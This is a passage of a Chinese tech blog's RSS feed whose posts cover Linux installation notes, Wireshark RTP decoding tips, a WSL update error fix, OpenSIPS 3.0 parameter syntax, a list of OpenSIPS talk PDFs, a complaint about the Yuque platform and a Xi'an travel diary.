&lt;h1 id=&#34;启动盘制作&#34;&gt;启动盘制作&lt;/h1&gt;
&lt;p&gt;ventoy：试了几次，无法开机，遂放弃
rufus：能够正常使用；注意分区类型要选择GPT。最新款的一些电脑都是支持uefi的，所以选择GPT分区，一定没问题。&lt;/p&gt;
&lt;h1 id=&#34;u盘启动&#34;&gt;U盘启动&lt;/h1&gt;
&lt;p&gt;开机后按F2, 里面有一个是设置BIOS优先级，可以设置优先U盘启动&lt;/p&gt;
&lt;h1 id=&#34;磁盘分区&#34;&gt;磁盘分区&lt;/h1&gt;
&lt;p&gt;因为之前设置了默认的整个磁盘分区，根目录只有15G, 太小了，所以我选择手动分区
先设置一个efi分区，就用默认的300M就可以，默认弹窗出来，是不需要设置挂在目录的
设置根分区 /, 我分了300G
设置/home分区，剩下的磁盘都分给他
我没有设置swap分区，因为我觉得32G内存够大，不需要swap&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;其他&lt;/h1&gt;
&lt;p&gt;后续的配置非常简单，基本点点按钮就能搞定&lt;/p&gt;
&lt;h1 id=&#34;体验&#34;&gt;体验&lt;/h1&gt;
&lt;p&gt;总体来说，安装软件是最舒服的一件事。不需要像安装manjaro那样，到处找安装常用应用的教程。只需要打开应用商店，点击下载就可以了。
整个安装过程，我觉得磁盘分区是最难的部分。其他都是非常方便的。
感觉深度的界面很漂亮，值得体验&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;问题&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;NUC自带的麦克风无法外放声音，插有线耳机也不行，只有蓝牙耳机能用&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Wireshark 使用技巧</title>
      <link>https://wdd.js.org/posts/2022/12/wireshark-101/</link>
      <pubDate>Sun, 11 Dec 2022 14:33:04 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/wireshark-101/</guid>
      <description>&lt;h1 id=&#34;0-前提条件&#34;&gt;0. 前提条件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;wireshark 4.0.2&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-时间显示&#34;&gt;1. 时间显示&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wireshark-101/2022-12-11-15-54-39.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;wireshark的默认时间显示是抓包的相对时间， 如果我们时间按照年月日时分秒显示，就需要进行如下设置:&lt;/p&gt;
&lt;p&gt;视图-&amp;gt;时间显示格式-&amp;gt;选择具体的时间格式&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wireshark-101/2022-12-11-15-59-57.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-udp解码为rtp&#34;&gt;2. UDP解码为RTP&lt;/h1&gt;
&lt;h2 id=&#34;方案1&#34;&gt;方案1&lt;/h2&gt;
&lt;p&gt;在一个包UDP包上点击右键，出现如下弹框，选择&lt;strong&gt;Decode As&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wireshark-101/2022-12-11-16-03-18.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;再当前值上选择RTP
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wireshark-101/2022-12-11-16-04-59.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;方案2&#34;&gt;方案2&lt;/h2&gt;
&lt;p&gt;方案1有一个缺点，只能过滤单一端口的UDP包，将其解码为RTP。&lt;/p&gt;
&lt;p&gt;假如有很多的UDP包，并且端口都不一样，如果想把这些包都解码为RTP,  则需要如下设置。&lt;/p&gt;
&lt;p&gt;选择分析-&amp;gt;启用的协议&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wireshark-101/2022-12-11-16-07-47.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在搜索框中输入RTP, 然后启用RTP的&lt;strong&gt;rtp_udp&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wireshark-101/2022-12-11-16-08-46.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows更新之后 Linux报错 Error 0x80040154</title>
      <link>https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/</link>
      <pubDate>Sun, 11 Dec 2022 14:12:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/</guid>
      <description>&lt;p&gt;最近我更新了Windows, 之后我的Windows Linux子系统Ubuntu打开就报错了&lt;/p&gt;
&lt;p&gt;报错截图如下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/2022-12-11-14-15-00.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在网上搜了一边之后，很多教程都是说要打开Windows的子系统的功能。 但是由于我已经使用Linux子系统已经很长时间了，我觉得应该和这个设置无关。&lt;/p&gt;
&lt;p&gt;而且我检查了一下，我的这个设置本来就是打开的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/2022-12-11-14-18-02.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我在Powershell里输入 wsl， 这个命令都直接报错了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\WINDOWS\system32&amp;gt; wsl --install
没有注册类
Error code: Wsl/0x80040154
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后我到wsl的github上搜索类似的问题，查到有很多类似的描述，都是升级之后遇到的问题，我试了好几个方式，都没用。&lt;/p&gt;
&lt;p&gt;但是最后这个有用了！&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/WSL/issues/9064&#34;&gt;https://github.com/microsoft/WSL/issues/9064&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/2022-12-11-14-24-09.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;解决的方案就是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;卸载已经安装过的&lt;strong&gt;Windows SubSystem For Linux Preview&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;然后再Windows应用商店重新安装这个应用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/2022-12-11-14-27-43.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Windows的升级之后，可能Windows Linux子系统组建也更新了某些了内容。&lt;/p&gt;
&lt;p&gt;所以需要重装。&lt;/p&gt;
&lt;p&gt;这里不得不吐槽一下WSL, 这个工具仅仅是个玩具。随着windows更新，这个工具随时都会崩溃，最好不要太依赖它。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Edge浏览器双击标签栏 关闭标签页</title>
      <link>https://wdd.js.org/posts/2022/12/double-click-close-tab/</link>
      <pubDate>Wed, 07 Dec 2022 09:17:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/double-click-close-tab/</guid>
      <description>&lt;p&gt;在设置里搜索&lt;strong&gt;双击&lt;/strong&gt;，如果有使用双击关闭浏览器选项卡， 则开启。&lt;/p&gt;
&lt;p&gt;对于用鼠标关闭标签页来说，的确可以提高极大的效率。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/double-click-close-tab/2022-12-07-09-32-38.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>为什么我不再使用语雀</title>
      <link>https://wdd.js.org/posts/2022/12/why-i-dont-not-use-yuque-any-more/</link>
      <pubDate>Tue, 06 Dec 2022 21:10:38 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/why-i-dont-not-use-yuque-any-more/</guid>
      <description>&lt;p&gt;我在2019年的六月份时候，开始使用语雀。&lt;/p&gt;
&lt;p&gt;一路走来，我见证了语雀的功能越来越多，但是于此同时，我也越来越讨厌语雀。&lt;/p&gt;
&lt;p&gt;2022年12月初，我基本上把语雀上的所有内容都迁移到我的hugo博客上。&lt;/p&gt;
&lt;p&gt;我的博客很乱，也很多。我写了一个脚本，一个一个知识库的搬迁，总体速度还算快，唯一不便的就是图片需要一个一个复制粘贴。&lt;/p&gt;
&lt;p&gt;有些图片是用语雀的绘图语言例如plantuml编写的，就只能截图保存了。&lt;/p&gt;
&lt;p&gt;总之，我也是蛮累的。&lt;/p&gt;
&lt;p&gt;简单列一下我不喜欢语雀的几个原因:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;性能差，首页渲染慢&lt;/strong&gt;，常常要等很久，首页才能打开&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;产品定位混乱，随意更改用户数据&lt;/strong&gt;
&lt;ol&gt;
&lt;li&gt;我记得有时候我把知识库升级成了空间，过了一段时间，不知道为什么空间由变成了知识库。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数字花园这个概念真的很烂&lt;/strong&gt;。我好好的个人主页，某一天打开，大变样，换了个名字，叫做数字花园。甚至没有给用户一个选择保留老版本的个人主页的权利。&lt;strong&gt;太不尊重用户了&lt;/strong&gt;！！ 就好像你下班回家，看见房门被人撬开，你打开房门，看见有人在你的客厅种满大蒜，然后还兴高采烈的告诉你，看，这是您的数字菜园！多好，以后不用买蒜了。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;会员的流量计费规则&lt;/strong&gt;， 或许现在的计费规则已经变了，我也没有再充会员，但是再以前。即使是会员，也是按流量计费的。什么叫按流量计费，假如你的一篇博客里上传了一张1mb的图片，即使你后来把这个图片删了，这1mb的流量还是会存在。而且流量是一直往上涨的，还不像运营商，每月一号给你清零一次的机会。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>模块传参的重构</title>
      <link>https://wdd.js.org/opensips/3x/module-args/</link>
      <pubDate>Sat, 03 Dec 2022 21:01:02 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/3x/module-args/</guid>
      <description>&lt;p&gt;写过opensips脚本的同学，往往对函数的传参感到困惑。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ds_select_dst()可以接受整数或者值为正数的变量作为第一个参数，但是nat_uac_test()的第一个参数就只能是整数，而不能是变量&lt;/li&gt;
&lt;li&gt;为什么rl_check()可以接受格式化的字符串，而save()只能接受字符串。&lt;/li&gt;
&lt;li&gt;为什么&lt;code&gt;ds_select_dst(&amp;quot;1&amp;quot;, &amp;quot;4&amp;quot;)&lt;/code&gt; 作为整数也要加上双引号？&lt;/li&gt;
&lt;li&gt;为什么变量要加上双引号？ &lt;code&gt;ds_select_dst(&amp;quot;$var(aa)&amp;quot;, &amp;quot;4&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;为什么&lt;code&gt;t_on_branch(&amp;quot;1&amp;quot;)&lt;/code&gt;路由的钩子要加上双引号？&lt;/li&gt;
&lt;li&gt;为什么&lt;code&gt;route(go_to_something);&lt;/code&gt;这里又不需要加上引号？&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ds_select_dst&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aa&lt;span style=&#34;color:#f92672&#34;&gt;)=&lt;/span&gt;1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ds_select_dst&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(aa)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rl_check&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gw_&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(limit)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;#格式化的gw_$ru&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;#单纯的字符串作为参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从3.0开始，传参可以更加自然。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整数可以直接传参，不用加双引号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;输入或者输出的$var(), 不用加双引号，加了反而会报错&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;格式化字符串，需要加双引号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(bb)_&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(b)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/&#34;&gt;https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Script-Syntax-3-0#&#34;&gt;https://www.opensips.org/Documentation/Script-Syntax-3-0#&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Pdf学习资料</title>
      <link>https://wdd.js.org/opensips/pdf/</link>
      <pubDate>Sat, 03 Dec 2022 16:02:18 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/pdf/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;./TelNYX.pdf&#34;&gt;TelNYX.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./OpenSIPS%202.3.pdf&#34;&gt;OpenSIPS 2.3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./mediasoup%20Cutting%20Edge%20WebRTC%20Video%20COnferencing.pdf&#34;&gt;mediasoup Cutting Edge WebRTC Video COnferencing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./FreeSWITCH-driven%20routing%20in%20OpenSIPS.pdf&#34;&gt;FreeSWITCH-driven routing in OpenSIPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./Contact%20center%20on%20Steroids%20Voicenter.pdf&#34;&gt;Voicenter: Contact center on Steroids&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./Vlad_Paiu-Distributed_OpenSIPS_Systems_Cluecon14.pdf&#34;&gt;Vlad_Paiu-Distributed_OpenSIPS_Systems_Cluecon14.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./Vlad_Paiu-OpenSIPS_Summit_Austin_2015-Async.pdf&#34;&gt;Vlad_Paiu-OpenSIPS_Summit_Austin_2015-Async.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Ionut_Ionita-OpenSIPS_Summit2017-Capturing_beyond_SIP.pdf&#34;&gt;Ionut_Ionita-OpenSIPS_Summit2017-Capturing_beyond_SIP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;FLAVIO_GONCALVES-Fraud_in_VoIP_Today.pdf&#34;&gt;FLAVIO_GONCALVES-Fraud_in_VoIP_Today.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Alexandr_Dubovikov-OpenSIPS_Summit2017-RTC_Threat_Intelligence_Exchange.pdf&#34;&gt;Alexandr_Dubovikov-OpenSIPS_Summit2017-RTC_Threat_Intelligence_Exchange.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;OpenSIPS_LoadBalancing.pdf&#34;&gt;OpenSIPS_LoadBalancing.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Vlad_Paiu-OpenSIPS_Summit_2104-OpenSIPS_End_User_Services.pdf&#34;&gt;Vlad_Paiu-OpenSIPS_Summit_2104-OpenSIPS_End_User_Services.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Razvan_Crainea-OpenSIPS_Summit2017-From_SIPI_Trunks_to_End_Users.pdf&#34;&gt;Razvan_Crainea-OpenSIPS_Summit2017-From_SIPI_Trunks_to_End_Users.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Razvan_Crainea-OpenSIPS_Summit-Scaling_Asterisk.pdf&#34;&gt;Razvan_Crainea-OpenSIPS_Summit-Scaling_Asterisk.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Vlad_Paiu-OpenSIPS_Summit-Service_Enabling_for_Asterisk.pdf&#34;&gt;Vlad_Paiu-OpenSIPS_Summit-Service_Enabling_for_Asterisk.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Jonas_Borjesson-OpenSIPS_Summit_Austin_2015.pdf&#34;&gt;Jonas_Borjesson-OpenSIPS_Summit_Austin_2015.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Michele_Pinasi-OpenSIPS_Summit2017-How_we_did_VoIP.pdf&#34;&gt;Michele_Pinasi-OpenSIPS_Summit2017-How_we_did_VoIP.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Bogdan_Iancu-OpenSIPS_Summit_Keynotes.pdf&#34;&gt;Bogdan_Iancu-OpenSIPS_Summit_Keynotes.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Giovanni_Maruzselli-OpenSIPS_Summit2017-Scaling_FreeSWITCHes.pdf&#34;&gt;Giovanni_Maruzselli-OpenSIPS_Summit2017-Scaling_FreeSWITCHes.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Maksym_Sobolyev-OpenSIPS_Summit2017-Sippy_Labs_update.pdf&#34;&gt;Maksym_Sobolyev-OpenSIPS_Summit2017-Sippy_Labs_update.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;docker-cluster.pdf&#34;&gt;docker-cluster.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;./voip%20malware%20attack%20tool%20.pdf&#34;&gt;voip malware attack tool .pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Bogdan_Iancu-OpenSIPS_Summit-OpenSIPS_2_1.pdf&#34;&gt;Bogdan_Iancu-OpenSIPS_Summit-OpenSIPS_2_1.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Pete_Kelly-OpenSIPS_Workshop_Chicago_2015-Calling_Cards_B2BUA.pdf&#34;&gt;Pete_Kelly-OpenSIPS_Workshop_Chicago_2015-Calling_Cards_B2BUA.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Bogdan_Iancu-OpenSIPS_Summit-keynotes.pdf&#34;&gt;Bogdan_Iancu-OpenSIPS_Summit-keynotes.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Alex_Goulis-Opensips_CNAME.pdf&#34;&gt;Alex_Goulis-Opensips_CNAME.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;OpenSIPS_2.0_Framework.pdf&#34;&gt;OpenSIPS_2.0_Framework.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;Norman_Brandinger-OpenSIPS_Summit_2014-Advanced_SIP_Routing_with_OpenSIPS_modules.pdf&#34;&gt;Norman_Brandinger-OpenSIPS_Summit_2014-Advanced_SIP_Routing_with_OpenSIPS_modules.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>西安之旅 不仅有羊肉泡馍 也有长恨歌</title>
      <link>https://wdd.js.org/posts/2022/12/xian-travel/</link>
      <pubDate>Fri, 02 Dec 2022 20:38:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/xian-travel/</guid>
      <description>&lt;p&gt;一年过半以后，偶然打开微信公众号，看到草稿箱里的篇文章。我才回想起去年带女友去西安的那个遥远的夏天。&lt;/p&gt;
&lt;p&gt;如今女友已经变成老婆，这篇文章我才想起来发表。&lt;/p&gt;
&lt;h1 id=&#34;day-1-钟楼-鼓楼-回民街&#34;&gt;day 1 钟楼 鼓楼 回民街&lt;/h1&gt;
&lt;p&gt;那是六月末的时候，和女友一起坐火车去了趟西安。&lt;/p&gt;
&lt;p&gt;为什么要去西安呢？据吃货女友说，西安有非常多的好吃的。所以人生是必须要去一趟的。&lt;/p&gt;
&lt;p&gt;清晨，我们从南京南站出发坐动车，一路向西，坐了5个多小时，到达西安北站。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-41-29.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;路上我带了一个1500ml的水瓶，以及1500ml的酸奶。&lt;/p&gt;
&lt;p&gt;女友吐槽说，还好没做飞机，不然我就像宝强一样，要在机场干完一大瓶酸奶了。&lt;/p&gt;
&lt;p&gt;下了动车，立即前往钟楼订的宾馆，放置行李。&lt;/p&gt;
&lt;p&gt;西安钟楼位于西安市中心，是中国现存钟楼中形制最大、保存最完整的一座。建于明太祖洪武十七年，初建于今广济街口，与鼓楼相对，明神宗万历十年整体迁移于今址。&lt;/p&gt;
&lt;p&gt;沿着钟楼附近，我们逛了一圈回民街。&lt;/p&gt;
&lt;p&gt;回民街是西安著名的美食文化街区，是西安小吃街区。&lt;/p&gt;
&lt;p&gt;西安回民街作为西安风情的代表之一，是回民街区多条街道的统称，由北广济街、北院门、西羊市、大皮院、化觉巷、洒金桥等数条街道组成，在钟鼓楼后。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-42-22.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;钟楼&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-42-36.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-42-46.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;day-2-大唐芙蓉城-大唐不夜城-大雁塔&#34;&gt;day 2 大唐芙蓉城 大唐不夜城 大雁塔&lt;/h1&gt;
&lt;p&gt;大唐芙蓉城是一座仿唐建筑，里面有许多景点，或许我们不应该早上来，因为上午太热了。&lt;/p&gt;
&lt;p&gt;唯一庆幸的是，我们带了一个很大的水杯，而且芙蓉城里提供免费的开水，所以我们才没有被渴死。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-43-17.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;大唐芙蓉城 西游师徒四人 雕塑&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-44-29.png&#34;&gt;
傍晚的 大唐不夜城&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-44-43.png&#34;&gt;
夜幕降临的 大唐不夜城&lt;/p&gt;
&lt;p&gt;遗憾之一：大雁塔没有去看，因为当时正在维修，周围全是脚手架。
遗憾之二：没有到陕西历史博物馆看看，因为没有早点预约&lt;/p&gt;
&lt;p&gt;女友埋怨我说我不早点做攻略，害得这么多景点去不了。&lt;/p&gt;
&lt;p&gt;我说我是做了攻略的，还记在备忘录里面呢。&lt;/p&gt;
&lt;p&gt;女友打开我的备忘录一看，笑出眼泪说：你做的啥狗屁攻略，就这几个字！男人果然靠不住！&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/12/xian-travel/2022-12-02-20-45-24.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;我说: 这你就不懂了吧，啥都写清楚，一个一个点打卡多没意思。&lt;/p&gt;
&lt;h1 id=&#34;day3-华清宫-兵马俑-长恨歌&#34;&gt;day3 华清宫 兵马俑 长恨歌&lt;/h1&gt;
&lt;p&gt;由于西安攻略做的太过肤浅，所以第二天晚上决定直接跟团。在网上买了两张华清宫兵马俑和长恨歌的一日游。&lt;/p&gt;
&lt;p&gt;说实在的，华清宫没啥意思，都是洗澡池子。&lt;/p&gt;
&lt;p&gt;蒋介石洗过澡的池子，杨贵妃的洗澡池子，唐明皇的洗澡池子，大臣们的洗澡池子。&lt;/p&gt;
&lt;p&gt;逛完之后，下午我们坐着旅游大巴，前往兵马俑。&lt;/p&gt;
